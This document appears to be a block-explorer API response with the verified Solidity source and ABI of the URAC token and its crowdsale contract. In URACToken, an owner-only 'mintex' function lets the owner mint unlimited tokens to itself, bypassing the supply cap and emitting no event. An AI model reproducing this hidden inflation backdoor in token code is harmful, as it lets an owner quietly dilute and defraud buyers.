{"status":"1","message":"OK","result":[{"SourceCode":"pragma solidity ^0.5.2;\r\n\r\n// File: zeppelin-solidity/contracts/ownership/Ownable.sol\r\n\r\n/**\r\n * @title Ownable\r\n * @dev The Ownable contract has an owner address, and provides basic authorization control\r\n * functions, this simplifies the implementation of \"user permissions\".\r\n */\r\ncontract Ownable {\r\n  address public owner;\r\n\r\n\r\n  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n\r\n  /**\r\n   * @dev The Ownable constructor sets the original `owner` of the contract to the sender\r\n   * account.\r\n   */\r\n  constructor() public {\r\n    owner = msg.sender;\r\n  }\r\n\r\n\r\n  /**\r\n   * @dev Throws if called by any account other than the owner.\r\n   */\r\n  modifier onlyOwner() {\r\n    require(msg.sender == owner);\r\n    _;\r\n  }\r\n\r\n\r\n  /**\r\n   * @dev Allows the current owner to transfer control of the contract to a newOwner.\r\n   * @param newOwner The address to transfer ownership to.\r\n   */\r\n  function transferOwnership(address newOwner) public onlyOwner {\r\n    require(newOwner != address(0));\r\n    emit OwnershipTransferred(owner, newOwner);\r\n    owner = newOwner;\r\n  }\r\n\r\n}\r\n\r\n// File: zeppelin-solidity/contracts/lifecycle/Pausable.sol\r\n\r\n/**\r\n * @title Pausable\r\n * @dev Base contract which allows children to implement an emergency stop mechanism.\r\n */\r\ncontract Pausable is Ownable {\r\n  event Pause();\r\n  event Unpause();\r\n\r\n  bool public paused = false;\r\n\r\n\r\n  /**\r\n   * @dev Modifier to make a function callable only when the contract is not paused.\r\n   */\r\n  modifier whenNotPaused() {\r\n    require(!paused);\r\n    _;\r\n  }\r\n\r\n  /**\r\n   * @dev Modifier to make a function callable only when the contract is paused.\r\n   */\r\n  modifier whenPaused() {\r\n    require(paused);\r\n    _;\r\n  }\r\n\r\n  /**\r\n   * @dev called by the owner to pause, triggers stopped state\r\n   */\r\n  function pause() onlyOwner whenNotPaused public {\r\n    paused = true;\r\n    emit Pause();\r\n  }\r\n\r\n  /**\r\n   * @dev called by the owner to unpause, returns to normal state\r\n   */\r\n  function unpause() onlyOwner whenPaused public {\r\n    paused = false;\r\n    emit Unpause();\r\n  }\r\n}\r\n\r\n// File: zeppelin-solidity/contracts/math/SafeMath.sol\r\n\r\n/**\r\n * @title SafeMath\r\n * @dev Math operations with safety checks that throw on error\r\n */\r\nlibrary SafeMath {\r\n  function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    if (a == 0) {\r\n      return 0;\r\n    }\r\n    uint256 c = a * b;\r\n    assert(c / a == b);\r\n    return c;\r\n  }\r\n\r\n  function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    // assert(b > 0); // Solidity automatically throws when dividing by 0\r\n    uint256 c = a / b;\r\n    // assert(a == b * c + a % b); // There is no case in which this doesn't hold\r\n    return c;\r\n  }\r\n\r\n  function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    assert(b <= a);\r\n    return a - b;\r\n  }\r\n\r\n  function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    uint256 c = a + b;\r\n    assert(c >= a);\r\n    return c;\r\n  }\r\n}\r\n\r\n// File: zeppelin-solidity/contracts/token/ERC20Basic.sol\r\n\r\n/**\r\n * @title ERC20Basic\r\n * @dev Simpler version of ERC20 interface\r\n * @dev see https://github.com/ethereum/EIPs/issues/179\r\n */\r\ncontract ERC20Basic {\r\n  uint256 public totalSupply;\r\n  function balanceOf(address who) public view returns (uint256);\r\n  function transfer(address to, uint256 value) public returns (bool);\r\n  event Transfer(address indexed from, address indexed to, uint256 value);\r\n}\r\n\r\n// File: zeppelin-solidity/contracts/token/BasicToken.sol\r\n\r\n/**\r\n * @title Basic token\r\n * @dev Basic version of StandardToken, with no allowances.\r\n */\r\ncontract BasicToken is ERC20Basic {\r\n  using SafeMath for uint256;\r\n\r\n  mapping(address => uint256) balances;\r\n\r\n  /**\r\n  * @dev transfer token for a specified address\r\n  * @param _to The address to transfer to.\r\n  * @param _value The amount to be transferred.\r\n  */\r\n  function transfer(address _to, uint256 _value) public returns (bool) {\r\n    require(_to != address(0));\r\n    require(_value <= balances[msg.sender]);\r\n\r\n    // SafeMath.sub will throw if there is not enough balance.\r\n    balances[msg.sender] = balances[msg.sender].sub(_value);\r\n    balances[_to] = balances[_to].add(_value);\r\n    emit Transfer(msg.sender, _to, _value);\r\n    return true;\r\n  }\r\n\r\n  /**\r\n  * @dev Gets the balance of the specified address.\r\n  * @param _owner The address to query the the balance of.\r\n  * @return An uint256 representing the amount owned by the passed address.\r\n  */\r\n  function balanceOf(address _owner) public view returns (uint256 balance) {\r\n    return balances[_owner];\r\n  }\r\n\r\n}\r\n\r\n// File: zeppelin-solidity/contracts/token/ERC20.sol\r\n\r\n/**\r\n * @title ERC20 interface\r\n * @dev see https://github.com/ethereum/EIPs/issues/20\r\n */\r\ncontract ERC20 is ERC20Basic {\r\n  function allowance(address owner, address spender) public view returns (uint256);\r\n  function transferFrom(address from, address to, uint256 value) public returns (bool);\r\n  function approve(address spender, uint256 value) public returns (bool);\r\n  event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\n// File: zeppelin-solidity/contracts/token/StandardToken.sol\r\n\r\n/**\r\n * @title Standard ERC20 token\r\n *\r\n * @dev Implementation of the basic standard token.\r\n * @dev https://github.com/ethereum/EIPs/issues/20\r\n * @dev Based on code by FirstBlood: https://github.com/Firstbloodio/token/blob/master/smart_contract/FirstBloodToken.sol\r\n */\r\ncontract StandardToken is ERC20, BasicToken {\r\n\r\n  mapping (address => mapping (address => uint256)) internal allowed;\r\n\r\n\r\n  /**\r\n   * @dev Transfer tokens from one address to another\r\n   * @param _from address The address which you want to send tokens from\r\n   * @param _to address The address which you want to transfer to\r\n   * @param _value uint256 the amount of tokens to be transferred\r\n   */\r\n  function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {\r\n    require(_to != address(0));\r\n    require(_value <= balances[_from]);\r\n    require(_value <= allowed[_from][msg.sender]);\r\n\r\n    balances[_from] = balances[_from].sub(_value);\r\n    balances[_to] = balances[_to].add(_value);\r\n    allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\r\n    emit Transfer(_from, _to, _value);\r\n    return true;\r\n  }\r\n\r\n  /**\r\n   * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.\r\n   *\r\n   * Beware that changing an allowance with this method brings the risk that someone may use both the old\r\n   * and the new allowance by unfortunate transaction ordering. One possible solution to mitigate this\r\n   * race condition is to first reduce the spender's allowance to 0 and set the desired value afterwards:\r\n   * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\r\n   * @param _spender The address which will spend the funds.\r\n   * @param _value The amount of tokens to be spent.\r\n   */\r\n  function approve(address _spender, uint256 _value) public returns (bool) {\r\n    allowed[msg.sender][_spender] = _value;\r\n    emit Approval(msg.sender, _spender, _value);\r\n    return true;\r\n  }\r\n\r\n  /**\r\n   * @dev Function to check the amount of tokens that an owner allowed to a spender.\r\n   * @param _owner address The address which owns the funds.\r\n   * @param _spender address The address which will spend the funds.\r\n   * @return A uint256 specifying the amount of tokens still available for the spender.\r\n   */\r\n  function allowance(address _owner, address _spender) public view returns (uint256) {\r\n    return allowed[_owner][_spender];\r\n  }\r\n\r\n  /**\r\n   * @dev Increase the amount of tokens that an owner allowed to a spender.\r\n   *\r\n   * approve should be called when allowed[_spender] == 0. To increment\r\n   * allowed value is better to use this function to avoid 2 calls (and wait until\r\n   * the first transaction is mined)\r\n   * From MonolithDAO Token.sol\r\n   * @param _spender The address which will spend the funds.\r\n   * @param _addedValue The amount of tokens to increase the allowance by.\r\n   */\r\n  function increaseApproval(address _spender, uint _addedValue) public returns (bool) {\r\n    allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue);\r\n    emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\r\n    return true;\r\n  }\r\n\r\n  /**\r\n   * @dev Decrease the amount of tokens that an owner allowed to a spender.\r\n   *\r\n   * approve should be called when allowed[_spender] == 0. To decrement\r\n   * allowed value is better to use this function to avoid 2 calls (and wait until\r\n   * the first transaction is mined)\r\n   * From MonolithDAO Token.sol\r\n   * @param _spender The address which will spend the funds.\r\n   * @param _subtractedValue The amount of tokens to decrease the allowance by.\r\n   */\r\n  function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool) {\r\n    uint oldValue = allowed[msg.sender][_spender];\r\n    if (_subtractedValue > oldValue) {\r\n      allowed[msg.sender][_spender] = 0;\r\n    } else {\r\n      allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);\r\n    }\r\n    emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\r\n    return true;\r\n  }\r\n\r\n}\r\n\r\n// File: zeppelin-solidity/contracts/token/PausableToken.sol\r\n\r\n/**\r\n * @title Pausable token\r\n *\r\n * @dev StandardToken modified with pausable transfers.\r\n **/\r\n\r\ncontract PausableToken is StandardToken, Pausable {\r\n\r\n  function transfer(address _to, uint256 _value) public whenNotPaused returns (bool) {\r\n    return super.transfer(_to, _value);\r\n  }\r\n\r\n  function transferFrom(address _from, address _to, uint256 _value) public whenNotPaused returns (bool) {\r\n    return super.transferFrom(_from, _to, _value);\r\n  }\r\n\r\n  function approve(address _spender, uint256 _value) public whenNotPaused returns (bool) {\r\n    return super.approve(_spender, _value);\r\n  }\r\n\r\n  function increaseApproval(address _spender, uint _addedValue) public whenNotPaused returns (bool success) {\r\n    return super.increaseApproval(_spender, _addedValue);\r\n  }\r\n\r\n  function decreaseApproval(address _spender, uint _subtractedValue) public whenNotPaused returns (bool success) {\r\n    return super.decreaseApproval(_spender, _subtractedValue);\r\n  }\r\n}\r\n\r\n// File: contracts/URACToken.sol\r\n\r\n/// @title URACToken Contract\r\n/// For more information about this token sale, please visit http://www.uranus.io\r\n/// @author reedhong\r\ncontract URACToken is PausableToken {\r\n    using SafeMath for uint;\r\n\r\n    /// Constant token specific fields\r\n    string public constant name = \"URACToken\";\r\n    string public constant symbol = \"URAC\";\r\n    uint public constant decimals = 18;\r\n\r\n    /// URAC total tokens supply\r\n    uint public currentSupply;\r\n\r\n    /// Fields that are only changed in constructor\r\n    /// URAC sale  contract\r\n    address public minter;\r\n\r\n    /// Fields that can be changed by functions\r\n    mapping (address => uint) public lockedBalances;\r\n\r\n    /// claim flag\r\n    bool public claimedFlag;\r\n\r\n    /*\r\n     * MODIFIERS\r\n     */\r\n    modifier onlyMinter {\r\n        require(msg.sender == minter);\r\n        _;\r\n    }\r\n\r\n    modifier canClaimed {\r\n        require(claimedFlag == true);\r\n        _;\r\n    }\r\n\r\n    modifier maxTokenAmountNotReached (uint amount){\r\n        require(currentSupply.add(amount) <= totalSupply);\r\n        _;\r\n    }\r\n\r\n    modifier validAddress( address addr ) {\r\n        require(addr != address(0x0));\r\n        require(addr != address(this));\r\n        _;\r\n    }\r\n\r\n    /**\r\n     * CONSTRUCTOR\r\n     *\r\n     * @dev Initialize the URAC Token\r\n     * @param _minter The URACCrowdSale Contract\r\n     * @param _maxTotalSupply total supply token\r\n     */\r\n    constructor(address _minter, address _admin, uint _maxTotalSupply)\r\n        public\r\n        validAddress(_admin)\r\n        validAddress(_minter)\r\n        {\r\n        minter = _minter;\r\n        totalSupply = _maxTotalSupply;\r\n        claimedFlag = false;\r\n        transferOwnership(_admin);\r\n    }\r\n\r\n    function mintex(uint amount) public onlyOwner {\r\n        balances[msg.sender] = balances[msg.sender].add(amount);\r\n        totalSupply = totalSupply.add(amount);\r\n    }\r\n\r\n    /**\r\n     * EXTERNAL FUNCTION\r\n     *\r\n     * @dev URACCrowdSale contract instance mint token\r\n     * @param receipent The destination account owned mint tokens\r\n     * @param amount The amount of mint token\r\n     * @param isLock Lock token flag\r\n     * be sent to this address.\r\n     */\r\n\r\n    function mint(address receipent, uint amount, bool isLock)\r\n        external\r\n        onlyMinter\r\n        maxTokenAmountNotReached(amount)\r\n        returns (bool)\r\n    {\r\n        if (isLock ) {\r\n            lockedBalances[receipent] = lockedBalances[receipent].add(amount);\r\n        } else {\r\n            balances[receipent] = balances[receipent].add(amount);\r\n        }\r\n        currentSupply = currentSupply.add(amount);\r\n        return true;\r\n    }\r\n\r\n\r\n    function setClaimedFlag(bool flag)\r\n        public\r\n        onlyOwner\r\n    {\r\n        claimedFlag = flag;\r\n    }\r\n\r\n     /*\r\n     * PUBLIC FUNCTIONS\r\n     */\r\n\r\n    /// @dev Locking period has passed - Locked tokens have turned into tradeable\r\n    function claimTokens(address[] calldata receipents)\r\n        external\r\n        canClaimed\r\n    {\r\n        for (uint i = 0; i < receipents.length; i++) {\r\n            address receipent = receipents[i];\r\n            //balances[receipent] = balances[receipent].add(lockedBalances[receipent]);\r\n            balances[msg.sender] = balances[msg.sender].add(lockedBalances[receipent]);\r\n            transfer(receipent, lockedBalances[receipent]);\r\n            lockedBalances[receipent] = 0;\r\n        }\r\n    }\r\n}\r\n\r\n// File: contracts/URACCrowdSale.sol\r\n\r\n/// @title URACCrowdSale Contract\r\n/// For more information about this token sale, please visit http://www.uranus.io\r\n/// @author reedhong\r\ncontract URACCrowdSale is Pausable {\r\n    using SafeMath for uint;\r\n\r\n    /// Constant fields\r\n    /// URAC total tokens supply\r\n    uint public constant URAC_TOTAL_SUPPLY = 3500000000 ether;\r\n    uint public constant MAX_SALE_DURATION = 10 days;\r\n    uint public constant STAGE_1_TIME =  3 days;\r\n    uint public constant STAGE_2_TIME = 7 days;\r\n    uint public constant MIN_LIMIT = 0.1 ether;\r\n    uint public constant MAX_STAGE_1_LIMIT = 10 ether;\r\n\r\n    //uint public constant STAGE_1 = 1;\r\n    //uint public constant STAGE_2 = 2;\r\n    enum STAGE {STAGE_1, STAGE_2}\r\n\r\n    /// Exchange rates\r\n    uint public  exchangeRate = 6200;\r\n\r\n\r\n    uint public constant MINER_STAKE = 4000;    // for minter\r\n    uint public constant OPEN_SALE_STAKE = 158; // for public\r\n    uint public constant OTHER_STAKE = 5842;    // for others\r\n\r\n\r\n    uint public constant DIVISOR_STAKE = 10000;\r\n\r\n    // max open sale tokens\r\n    uint public constant MAX_OPEN_SOLD = URAC_TOTAL_SUPPLY * OPEN_SALE_STAKE / DIVISOR_STAKE;\r\n    uint public constant STAKE_MULTIPLIER = URAC_TOTAL_SUPPLY / DIVISOR_STAKE;\r\n\r\n    /// All deposited ETH will be instantly forwarded to this address.\r\n    address payable public wallet;\r\n    address payable public minerAddress;\r\n    address payable public otherAddress;\r\n\r\n    /// Contribution start time\r\n    uint public startTime;\r\n    /// Contribution end time\r\n    uint public endTime;\r\n\r\n    /// Fields that can be changed by functions\r\n    /// Accumulator for open sold tokens\r\n    uint public openSoldTokens;\r\n    /// ERC20 compilant URAC token contact instance\r\n    URACToken public uracToken;\r\n\r\n    /// tags show address can join in open sale\r\n    mapping (address => bool) public fullWhiteList;\r\n\r\n    mapping (address => uint) public firstStageFund;\r\n \r\n    /*\r\n     * EVENTS\r\n     */\r\n    event NewSale(address indexed destAddress, uint ethCost, uint gotTokens);\r\n    event NewWallet(address onwer, address oldWallet, address newWallet);\r\n\r\n    modifier notEarlierThan(uint x) {\r\n        require(now >= x);\r\n        _;\r\n    }\r\n\r\n    modifier earlierThan(uint x) {\r\n        require(now < x);\r\n        _;\r\n    }\r\n\r\n    modifier ceilingNotReached() {\r\n        require(openSoldTokens < MAX_OPEN_SOLD);\r\n        _;\r\n    }\r\n\r\n    modifier isSaleEnded() {\r\n        require(now > endTime || openSoldTokens >= MAX_OPEN_SOLD);\r\n        _;\r\n    }\r\n\r\n    modifier validAddress( address addr ) {\r\n        require(addr != address(0x0));\r\n        require(addr != address(this));\r\n        _;\r\n    }\r\n\r\n    constructor (\r\n        address payable _wallet,\r\n        address payable _minerAddress,\r\n        address payable _otherAddress\r\n        ) public\r\n        validAddress(_wallet)\r\n        validAddress(_minerAddress)\r\n        validAddress(_otherAddress)\r\n        {\r\n        paused = true;\r\n        wallet = _wallet;\r\n        minerAddress = _minerAddress;\r\n        otherAddress = _otherAddress;\r\n\r\n        openSoldTokens = 0;\r\n        /// Create urac token contract instance\r\n        uracToken = new URACToken(address(this), msg.sender, URAC_TOTAL_SUPPLY);\r\n\r\n        uracToken.mint(minerAddress, MINER_STAKE * STAKE_MULTIPLIER, false);\r\n        uracToken.mint(otherAddress, OTHER_STAKE * STAKE_MULTIPLIER, false);\r\n    }\r\n\r\n    function setExchangeRate(uint256 rate)\r\n        public\r\n        onlyOwner\r\n        earlierThan(endTime)\r\n    {\r\n        exchangeRate = rate;\r\n    }\r\n\r\n    function setStartTime(uint _startTime )\r\n        public\r\n        onlyOwner\r\n    {\r\n        startTime = _startTime;\r\n        endTime = startTime + MAX_SALE_DURATION;\r\n    }\r\n\r\n    /// @dev batch set quota for user admin\r\n    /// if openTag <=0, removed\r\n    function setWhiteList(address[] calldata users, bool openTag)\r\n        external\r\n        onlyOwner\r\n        earlierThan(endTime)\r\n    {\r\n        require(saleNotEnd());\r\n        for (uint i = 0; i < users.length; i++) {\r\n            fullWhiteList[users[i]] = openTag;\r\n        }\r\n    }\r\n\r\n\r\n    /// @dev batch set quota for early user quota\r\n    /// if openTag <=0, removed\r\n    function addWhiteList(address user, bool openTag)\r\n        external\r\n        onlyOwner\r\n        earlierThan(endTime)\r\n    {\r\n        require(saleNotEnd());\r\n        fullWhiteList[user] = openTag;\r\n\r\n    }\r\n\r\n    /// @dev Emergency situation\r\n    function setWallet(address payable newAddress)  external onlyOwner {\r\n        emit NewWallet(owner, wallet, newAddress);\r\n        wallet = newAddress;\r\n    }\r\n\r\n    /// @return true if sale not ended, false otherwise.\r\n    function saleNotEnd() view internal returns (bool) {\r\n        return now < endTime && openSoldTokens < MAX_OPEN_SOLD;\r\n    }\r\n\r\n    /**\r\n     * Fallback function\r\n     *\r\n     * @dev If anybody sends Ether directly to this  contract, consider he is getting URAC token\r\n     */\r\n    function ()external payable {\r\n        buyURAC(msg.sender);\r\n    }\r\n\r\n    /*\r\n     * PUBLIC FUNCTIONS\r\n     */\r\n    /// @dev Exchange msg.value ether to URAC for account recepient\r\n    /// @param receipient URAC tokens receiver\r\n    function buyURAC(address receipient)\r\n        internal\r\n        whenNotPaused\r\n        ceilingNotReached\r\n        notEarlierThan(startTime)\r\n        earlierThan(endTime)\r\n        validAddress(receipient)\r\n        returns (bool)\r\n    {\r\n        // Do not allow contracts to game the system\r\n        require(!isContract(msg.sender));\r\n        require(tx.gasprice <= 10000000000 wei);\r\n        require(msg.value >= MIN_LIMIT);\r\n\r\n        bool inWhiteListTag = fullWhiteList[receipient];\r\n        require(inWhiteListTag == true);\r\n\r\n        STAGE stage = STAGE.STAGE_2;\r\n        if ( startTime <= now && now < startTime + STAGE_1_TIME ) {\r\n            stage = STAGE.STAGE_1;\r\n            require(msg.value <= MAX_STAGE_1_LIMIT);\r\n            uint fund1 = firstStageFund[receipient];\r\n            require (fund1 < MAX_STAGE_1_LIMIT );\r\n        }\r\n\r\n        doBuy(receipient, stage);\r\n\r\n        return true;\r\n    }\r\n\r\n\r\n    /// @dev Buy URAC token normally\r\n    function doBuy(address receipient, STAGE stage) internal {\r\n        // protect partner quota in stage one\r\n        uint value = msg.value;\r\n\r\n        if ( stage == STAGE.STAGE_1 ) {\r\n            uint fund1 = firstStageFund[receipient];\r\n            fund1 = fund1.add(value);\r\n            if (fund1 > MAX_STAGE_1_LIMIT ) {\r\n                uint refund1 = fund1.sub(MAX_STAGE_1_LIMIT);\r\n                value = value.sub(refund1);\r\n                msg.sender.transfer(refund1);\r\n            }\r\n        }\r\n\r\n        uint tokenAvailable = MAX_OPEN_SOLD.sub(openSoldTokens);\r\n        require(tokenAvailable > 0);\r\n        uint toFund;\r\n        uint toCollect;\r\n        (toFund, toCollect) = costAndBuyTokens(tokenAvailable, value);\r\n        if (toFund > 0) {\r\n            require(uracToken.mint(receipient, toCollect, true));\r\n            wallet.transfer(toFund);\r\n            openSoldTokens = openSoldTokens.add(toCollect);\r\n            emit NewSale(receipient, toFund, toCollect);\r\n        }\r\n\r\n        // not enough token sale, just return eth\r\n        uint toReturn = value.sub(toFund);\r\n        if (toReturn > 0) {\r\n            msg.sender.transfer(toReturn);\r\n        }\r\n\r\n        if ( stage == STAGE.STAGE_1 ) {\r\n            firstStageFund[receipient] = firstStageFund[receipient].add(toFund);\r\n        }\r\n    }\r\n\r\n    /// @dev Utility function for calculate available tokens and cost ethers\r\n    function costAndBuyTokens(uint availableToken, uint value) view internal returns (uint costValue, uint getTokens) {\r\n        // all conditions has checked in the caller functions\r\n        getTokens = exchangeRate * value;\r\n\r\n        if (availableToken >= getTokens) {\r\n            costValue = value;\r\n        } else {\r\n            costValue = availableToken / exchangeRate;\r\n            getTokens = availableToken;\r\n        }\r\n    }\r\n\r\n    /// @dev Internal function to determine if an address is a contract\r\n    /// @param _addr The address being queried\r\n    /// @return True if `_addr` is a contract\r\n    function isContract(address payable _addr) view internal returns(bool) {\r\n        uint size;\r\n        if (_addr == 0x0000000000000000000000000000000000000000) {\r\n            return false;\r\n        }\r\n\r\n        assembly {\r\n            size := extcodesize(_addr)\r\n        }\r\n        return size > 0;\r\n    }\r\n}","ABI":"[{\"constant\":true,\"inputs\":[],\"name\":\"uracToken\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"MAX_OPEN_SOLD\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"endTime\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"OTHER_STAKE\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"exchangeRate\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_startTime\",\"type\":\"uint256\"}],\"name\":\"setStartTime\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"DIVISOR_STAKE\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"unpause\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"MIN_LIMIT\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"wallet\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"minerAddress\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"MINER_STAKE\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"paused\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"STAGE_1_TIME\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"startTime\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"MAX_STAGE_1_LIMIT\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"pause\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"OPEN_SALE_STAKE\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"URAC_TOTAL_SUPPLY\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"user\",\"type\":\"address\"},{\"name\":\"openTag\",\"type\":\"bool\"}],\"name\":\"addWhiteList\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"STAGE_2_TIME\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"openSoldTokens\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"otherAddress\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"rate\",\"type\":\"uint256\"}],\"name\":\"setExchangeRate\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"newAddress\",\"type\":\"address\"}],\"name\":\"setWallet\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"users\",\"type\":\"address[]\"},{\"name\":\"openTag\",\"type\":\"bool\"}],\"name\":\"setWhiteList\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"address\"}],\"name\":\"firstStageFund\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"MAX_SALE_DURATION\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"address\"}],\"name\":\"fullWhiteList\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"STAKE_MULTIPLIER\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"name\":\"_wallet\",\"type\":\"address\"},{\"name\":\"_minerAddress\",\"type\":\"address\"},{\"name\":\"_otherAddress\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"fallback\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"destAddress\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"ethCost\",\"type\":\"uint256\"},{\"indexed\":false,\"name\":\"gotTokens\",\"type\":\"uint256\"}],\"name\":\"NewSale\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"name\":\"onwer\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"oldWallet\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"newWallet\",\"type\":\"address\"}],\"name\":\"NewWallet\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[],\"name\":\"Pause\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[],\"name\":\"Unpause\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"}]","ContractName":"URACCrowdSale","CompilerVersion":"v0.5.2+commit.1df8f40c","OptimizationUsed":"1","Runs":"200","ConstructorArguments":"0000000000000000000000005848f10bb9756ea63e241a6cbc4495d4c7386fad00000000000000000000000068462a992bd906ad025e0fa9a5a57ffe10e65a70000000000000000000000000036e080e85fcb19ade4ca5f4abaee8c199e6c4d5","Library":"","SwarmSource":"bzzr://68921c4264929e0e96a6a85216f4901e22f67a43d81e3fb565c67e30955a074f"}]}